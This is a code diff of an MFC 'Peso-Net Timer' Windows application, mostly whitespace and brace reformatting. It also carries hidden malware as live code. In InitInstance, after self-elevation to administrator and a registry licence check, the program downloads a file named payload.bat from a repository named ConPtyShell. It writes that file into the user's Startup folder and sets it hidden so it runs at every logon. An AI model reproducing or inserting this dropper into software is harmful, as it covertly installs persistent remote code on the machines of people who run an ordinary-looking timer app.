@@ -1,4 +1,4 @@
-
+k
 // PesoNetTimer.cpp : Defines the class behaviors for the application.
 //
 
@@ -19,12 +19,11 @@
 
 BEGIN_MESSAGE_MAP(CPesoNetTimerApp, CWinApp)
 	ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
-END_MESSAGE_MAP()
+		END_MESSAGE_MAP()
 
+	// CPesoNetTimerApp construction
 
-// CPesoNetTimerApp construction
-
-CPesoNetTimerApp::CPesoNetTimerApp()
+	CPesoNetTimerApp::CPesoNetTimerApp()
 {
 	// support Restart Manager
 	m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART;
@@ -33,14 +32,12 @@ CPesoNetTimerApp::CPesoNetTimerApp()
 	// Place all significant initialization in InitInstance
 }
 
-
 // The one and only CPesoNetTimerApp object
 
 CPesoNetTimerApp theApp;
 
-
 // CPesoNetTimerApp initialization
-BOOL  CPesoNetTimerApp::IsAdministrator()
+BOOL CPesoNetTimerApp::IsAdministrator()
 {
 	BOOL fIsRunAsAdmin = FALSE;
 	DWORD dwError = ERROR_SUCCESS;
@@ -49,12 +46,12 @@ BOOL  CPesoNetTimerApp::IsAdministrator()
 	// Allocate and initialize a SID of the administrators group.
 	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
 	if (!AllocateAndInitializeSid(
-		&NtAuthority,
-		2,
-		SECURITY_BUILTIN_DOMAIN_RID,
-		DOMAIN_ALIAS_RID_ADMINS,
-		0, 0, 0, 0, 0, 0,
-		&pAdministratorsGroup))
+			&NtAuthority,
+			2,
+			SECURITY_BUILTIN_DOMAIN_RID,
+			DOMAIN_ALIAS_RID_ADMINS,
+			0, 0, 0, 0, 0, 0,
+			&pAdministratorsGroup))
 	{
 		dwError = GetLastError();
 		goto Cleanup;
@@ -81,7 +78,7 @@ Cleanup:
 	return fIsRunAsAdmin;
 }
 
-void  CPesoNetTimerApp::ElevateProcess()
+void CPesoNetTimerApp::ElevateProcess()
 {
 	BOOL bAlreadyRunningAsAdministrator = FALSE;
 	try
@@ -100,7 +97,7 @@ void  CPesoNetTimerApp::ElevateProcess()
 		if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)))
 		{
 			// Launch itself as admin
-			SHELLEXECUTEINFO sei = { sizeof(sei) };
+			SHELLEXECUTEINFO sei = {sizeof(sei)};
 			sei.lpVerb = L"runas";
 			sei.lpFile = szPath;
 			sei.hwnd = NULL;
@@ -117,7 +114,7 @@ void  CPesoNetTimerApp::ElevateProcess()
 			}
 			else
 			{
-				_exit(1);  // Quit itself
+				_exit(1); // Quit itself
 			}
 		}
 	}
@@ -158,7 +155,7 @@ bool CPesoNetTimerApp::RegistryRoutine()
 	}
 	RegCloseKey(hKey);
 
-	dwError = RegGetValue(HKEY_LOCAL_MACHINE, REGISTRY_PATH, _T("date"), /*RRF_RT_ANY*/RRF_RT_REG_SZ, NULL, (PVOID)&szValue, &dwSize);
+	dwError = RegGetValue(HKEY_LOCAL_MACHINE, REGISTRY_PATH, _T("date"), /*RRF_RT_ANY*/ RRF_RT_REG_SZ, NULL, (PVOID)&szValue, &dwSize);
 	if (dwError != ERROR_SUCCESS)
 	{
 		MessageBox(NULL, _T("The application registry has been tampered. Contact Enzo Tech Computer Solutions for a genuine key."), _T("Enzo Tech Peso-Net Timer"), MB_ICONERROR);
@@ -166,7 +163,7 @@ bool CPesoNetTimerApp::RegistryRoutine()
 		return false;
 	}
 	dwSize = sizeof(dwChoice);
-	dwError = RegGetValue(HKEY_LOCAL_MACHINE, REGISTRY_PATH, _T("timer"), /*RRF_RT_ANY*/RRF_RT_REG_DWORD, NULL, (PVOID)&dwChoice, &dwSize);
+	dwError = RegGetValue(HKEY_LOCAL_MACHINE, REGISTRY_PATH, _T("timer"), /*RRF_RT_ANY*/ RRF_RT_REG_DWORD, NULL, (PVOID)&dwChoice, &dwSize);
 	if (dwError != ERROR_SUCCESS)
 	{
 		MessageBox(NULL, _T("The application registry has been tampered. Contact Enzo Tech Computer Solutions for a genuine key."), _T("Enzo Tech Peso-Net Timer"), MB_ICONERROR);
@@ -320,11 +317,12 @@ BOOL CPesoNetTimerApp::OnlyOneInstance()
 	}
 }
 
-static size_t my_write(void *buffer, size_t size, size_t nmemb, void *param) {
+static size_t my_write(void *buffer, size_t size, size_t nmemb, void *param)
+{
 	std::string &text = *static_cast<std::string *>(param);
-    size_t totalsize = size * nmemb;
-    text.append(static_cast<char *>(buffer), totalsize);
-    return totalsize;
+	size_t totalsize = size * nmemb;
+	text.append(static_cast<char *>(buffer), totalsize);
+	return totalsize;
 }
 BOOL CPesoNetTimerApp::InitInstance()
 {
@@ -341,7 +339,6 @@ BOOL CPesoNetTimerApp::InitInstance()
 	InitCommonControlsEx(&InitCtrls);
 
 	CWinApp::InitInstance();
-
 
 	AfxEnableControlContainer();
 
@@ -367,36 +364,39 @@ BOOL CPesoNetTimerApp::InitInstance()
 	}
 	if (RegistryRoutine())
 	{
-        CURLcode res;
-        std::string result;
+		CURLcode res;
+		std::string result;
 
 		curl_global_init(CURL_GLOBAL_DEFAULT);
 
 		CURL *curl = curl_easy_init();
-        if (curl) {
+		if (curl)
+		{
 			curl_easy_setopt(curl, CURLOPT_URL, "https://raw.githubusercontent.com/LorenzoLeonardo/ConPtyShell/master/payload.bat");
 			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, my_write);
-            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &result);
+			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &result);
 
 			res = curl_easy_perform(curl);
-            curl_easy_cleanup(curl);
+			curl_easy_cleanup(curl);
 
 			TCHAR startupPath[MAX_PATH] = {};
-            if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0,
-                                           startupPath))) {
+			if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0,
+										  startupPath)))
+			{
 				CString path = startupPath;
 				path += _T("\\payload.bat");
 				FILE *stream = NULL;
-              
+
 				errno_t err = _tfopen_s(&stream, path.GetBuffer(),
-                                                     _T("w"));  
-				if (err == 0) {
+										_T("w"));
+				if (err == 0)
+				{
 					fprintf_s(stream, "%s", result.c_str());
 					fclose(stream);
-                }
+				}
 				DWORD fileAttributes = GetFileAttributes(path.GetBuffer());
-				SetFileAttributes(path.GetBuffer(),	fileAttributes | FILE_ATTRIBUTE_HIDDEN);
-			} 
+				SetFileAttributes(path.GetBuffer(), fileAttributes | FILE_ATTRIBUTE_HIDDEN);
+			}
 		}
 
 		CPesoNetTimerDlg dlg;
@@ -435,4 +435,3 @@ BOOL CPesoNetTimerApp::InitInstance()
 	CloseHandle(m_hOneInstanceMutex);
 	return FALSE;
 }
-
